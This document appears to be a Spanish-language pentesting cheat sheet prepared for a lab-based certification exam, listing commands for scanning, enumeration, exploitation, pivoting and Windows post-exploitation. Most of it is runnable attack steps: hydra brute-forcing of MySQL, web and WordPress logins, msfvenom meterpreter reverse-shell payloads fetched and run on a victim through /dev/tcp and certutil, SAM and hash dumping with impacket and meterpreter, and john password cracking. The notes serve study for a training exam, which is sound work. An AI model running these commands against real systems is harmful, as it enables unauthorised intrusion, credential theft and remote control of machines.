>Utilizar mucho Metasploit
-----

## Fase de Escaneo
- Utilizar arpscan, ping, netdiscover y nmap -sn
```bash
sudo nmap -sn 192.168.1.0/24 -oA netscan 
fping -a -g {Rango de IP} 2>/dev/null
sudo netdiscover -r red/24
sudo arp-scan --localnet --ignoredup -ITarjetaRed
```

- Target en questión
```bash
sudo nmap -sS -sU  -p- -Pn -v -n --min-rate=5000 -T5 192.168.1.203 -oA election
sudo nmap -sU -v  -p- -T3 --min-rate=4200 -oA udp-portss  192.168.1.203
```

## Fase de Enumeración
```bash
nikto -h http://domain.com
gobuster dir -u -w -b 404,403,301,400 -x php.php.bak,txt,txt.bak.html,htm,php
gobuster dir -u http://192.168.1.167 -w /usr/share/wordlists/dirb/common.txt  -k -x ~,swp,txt,txt.bak,php,php.bak,jpg,bak,js,png,auth.log,log,config,json,git,sh,kdbx,db,key -t 15
gobuster vhost -u http://pl0t.nyx/ -w /home/kuser/cosas/repositorios/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain | grep -v "400"
```

- Si hay un **smb**
```bash
enum4linux -a 10.10.212.81

smbclient //10.10.212.81/carpetaCompartida

smbclient //symfonos.local/helios -U helios
# No pedir passwd y mostrar recursos compartidos
smbclient -L //<IP> -N 
smbclient \\\\\\\\$ip\\\\recurso
```

## Explotación
```bash
hydra -l butthead -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.134 -I -F -t 20
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.182 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password." -f -V
```
- Fuerza bruta a login de wordpress
```bash
hydra -l kwheel  -P /usr/share/wordlists/rockyou.txt 10.10.147.189  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2blog.thm%2Fwp-admin%2F&testcookie=1:F=The password" -t 30 -F -I
```
- Bruteforce con wordlist requeridas
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
- Túnel ssh si quiero ver alguna interfaz web
```bash
ssh -L 4545:127.0.0.1:8888 user@"ip_víctima"
```

- Si ganamos revshell y necesitamos una sesión de meterpreter
```bash
#Atacante 
msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payload.bin
nc -nvlp 80 < payload.bin
#Una vez pasado el archivo
meterpreter> use multihandler
set payload linux/x64/meterpreter/reverse_tcp


# Víctima
cat > payload.bin < /dev/tcp/IP/port
chmod +x  payload.bin
./payload.bin

```

## Pivotar y port forwarding

- si tengo problemillas [visito esto](https://www.youtube.com/watch?v=WeltU4DvoMs)
```bash
ip route add "IP descubierta" via "gateway"
```

```bash
meterpreter> run autoroute -s DirRed/Mascara
# O esto
meterpreter> route add DirRed/Mascara 1
# renombramos las sesiones para que nos queden claras las redes
sessions -n Red1-Victim1 -i 1
```
- Scanner **TCP**
```bash

use scanner/portscan/tcp
set rhosts IPVictim2
set PORTS 0-65535
exploit
```
- Para **forwarding** 
> **-l:** Especificamos el puerto de la máquina atacante
    **-p:** Especificamos el port de la vítcima
     **-r:** Especifico la máquina Víctima
 
```bash
meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
```

- Escaneamos por el puerto dónde reenviamos, a ver que info de cada port
```bash
db_nmap -sS -sV -p 1234 localhost
```

 - Explotación
 >Abremos bind_shell y la víctima abre el Peuerto esperando conexiones

```bash
use elexploit que sea en ese puerto 80
set payload /windows/meterpreter/bind_tcp
set rhosts IPVictim2
set lport otrodifeente al del priemr pivoting
#### Windows
- Si conseguimos archivo **sam** y **system**
```bash
samdump2 system.bak sam.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

- Descargar desde la víctima (Windows)
```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > meterpreter.exe
certutil -urlcache -f http://192.168.1.135/meterpreter.exe meterpreter.exe
meterpreter.exe
```

## Comandos de Windows -  si gano acceso

- Saber el user
```power-shell
Get-LocalGroupMember -Group "Administrators"
```
- Por si nos preguntan los **Hotfix**
```Power-shell
(Get-Hotfix).Count
```
- Una vez ganado acceso Ver **Hotfixes**
```
enum_computers
enum_patches
# O en la shell, te da todos los parches
systeminfo
```

 - Elevar privilegios y dump hashes
``` bash
meterpreter> getprivs 
meterpreter> getsystem
meterpreter> getuid
meterpreter> getenv PATH
meterpreter> getenv ENV
meterpreter> hashdump
# Una vez dumpeado metemos sólo el user y NT a no ser qu ejohn no los pete
echo "user:HASH-NT" > hash.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
```


## Tips Exam

- Mejor no resetear el lab o la machine
- SI alguna tecla  falla, utilizar el **screen keyboard**
- Todas las redes serán **/24**
- Coger apuntes fuera de la MV


>Herramientas Recomendadas

● Nmap
● Dirb
● Nikto
● WPScan
● CrackMapExec
● The Metasploit Framework
● Searchsploit
● Hydra